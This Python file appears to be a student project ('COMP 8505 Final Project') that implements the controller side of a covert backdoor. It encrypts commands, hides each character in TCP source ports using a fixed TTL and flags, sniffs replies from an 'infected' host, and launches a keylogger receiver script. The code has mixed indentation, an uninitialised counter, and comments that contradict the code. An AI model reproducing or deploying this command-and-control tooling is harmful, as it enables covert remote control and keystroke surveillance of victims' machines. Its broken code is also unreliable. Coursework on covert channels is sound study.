import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from AESCipher import AESCipher
import time #used for thread sleep methods
import argparse #used for easy arguments
import thread

'''
TCP Flags:
'F': 'FIN', 0x01
'S': 'SYN', 0x02
'R': 'RST', 0x04
'P': 'PSH', 0x08
'A': 'ACK', 0x10
'U': 'URG', 0x20
'E': 'ECE', 0x40
'C': 'CWR', 0x80
'''

packet = None


#Function :construct()
#Argument: character to send, destination address, flag to set
#Purpose: Takes in the specified letter and dst addr as arguments and creates the pkt.
#         I will set the Echo flag so the server knows that this is the secret datagram
#         meant to recieve. I will also be placing the msg in the sequence number in
#         the TCP header, and setting a timer with random times to send out the packets
#         to make the traffic look normal
def construct(char, setFlag):
    global ttlKey
    #  ord ==> converts the string character (length of 1) to an integer value represented
    #          through Unicode. The server will then decode this unicode value.
    letter = ord(char)
    destPort = random.randint(0,50000)
    packet = IP(dst=args.dest, ttl=ttlKey)/TCP(sport=letter, dport=destPort, flags=setFlag)
    return packet
	
	
'''
sendCommand sends the commands covertly and encrypted
'''
def sendCommand(command):
    global cipher
	global setFlag
	global endFlag
	randPort = random.randint(0,50000)
    encrypt_Command = cipher.encrypt(command)
	command = str(encrypt_Command)
    #packet = craft(encrypt_Command)
	for i in command:
		constructedPkt = construct(i, setFlag)
		#  send is a function imported with Scapy
		#  now we send the constructed packet
		send(constructedPkt)
	endOfOutput = IP(dst=args.dest, ttl=ttlKey)/TCP(sport=randPort, dport=randPort, flags=endFlag)
	send(endOfOutput)


def commandResult(packet):
    global ttlKey
    global args
    global cipher
    global output
	global validSource
    srcIP = packet[IP].src
    ttl = packet[IP].ttl
    if packet["IP"].src == validSource and packet[IP].ttl == ttlKey:
        counter += 1
        flag = packet['TCP'].flags
        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
        if flag == 0x40:
            #  we used ord in the client to convert the string character into a Unicoded value
            #  chr() now encodes the Unicoded value back as a string literal
            #  the message is stored in the sequence number field of the TCP header
            letter = chr(packet['TCP'].sport)
            output.append(letter)
        #End Flag detected
        elif flag == 0x20:
            print("END REACHED")
            print ("The Output:",*output,sep='\n')
            finalO = ('\n'.join(output))
            print (finalO)
            output = []
        #Congestion Flag detected
		elif flag == 0x80:
			'''
			How to open a new terminal from script
			-- Tested on Ubuntu 14.04.3 LTS
			os.system("x-terminal-emulator -e /bin/bash")
			'''
			subprocess.call(['gnome-terminal', '-x', './recvKeylog.py'])		
    else:
        return


def commandSniffer(threadName, infectedIP):
    sniff(filter="tcp and host "+args.dest, prn=commandResult)

#GLOBAL VARIABLES
ttlKey = 159
key = 'mysecretpassword'
IV = "abcdefghijklmnop"
cipher = AESCipher(key)
output = []
validSource = "192.168.0.11"
setFlag = "E"
endFlag = "U"

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Basic Backdoor',
    description='COMP 8505 Final Project by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-d', dest='dest', type = str, help = 'target ip', required=True)
arg_parser.add_argument('-p', dest='port', type = int, help = 'target port',default=99,const=99, nargs='?')
args = arg_parser.parse_args()
exit=["exit","quit","exit()","quit()"]

try:
   thread.start_new_thread( commandSniffer, ("commandSniffer",args.dest) )
except Exception as e:
    print (str(e))

while True:
    command = input('\033[92m'+args.dest+":"+str(args.port)+" ready"+'\033[0m')
    if command == "":
        continue
    elif any(item == command for item in exit):
        sys.exit()
    else:
        sendCommand(command)
